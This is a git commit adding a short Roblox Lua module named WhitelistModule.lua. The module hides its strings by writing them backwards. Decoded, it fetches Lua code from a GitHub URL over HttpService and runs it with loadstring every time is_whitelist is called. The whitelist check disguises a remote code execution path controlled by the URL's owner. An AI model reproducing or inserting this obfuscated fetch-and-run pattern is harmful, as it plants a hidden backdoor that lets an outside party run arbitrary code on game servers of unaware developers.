1a1332880cc5536c1b54bf8aa6dcbd928ae526de
borgorthedemon239 <1lefishe@gmail.com>
2025-04-07 23:28:03 -0300

    Create WhitelistModule.lua

---
+++ WhitelistModule.lua
@@ -0,0 +1,13 @@
+local b = {};
+
+local a = 'aul.tsiletihW/niam/sdaeh/sfer/gniht/932nomedehtrogrob/moc.tnetnocresubuhtig.war//:sptth';
+local c = game[('ecivreSteG'):reverse()];
+local d = c(game, ('ecivreSpttH'):reverse())
+local f = d[('cnysAteG'):reverse()];
+function b:is_whitelist(u)
+	if table.find(_G[('gnirtsdaoL'):reverse()](f(d, a:reverse()))(), u) then
+		return true
+	end
+end
+
+return b
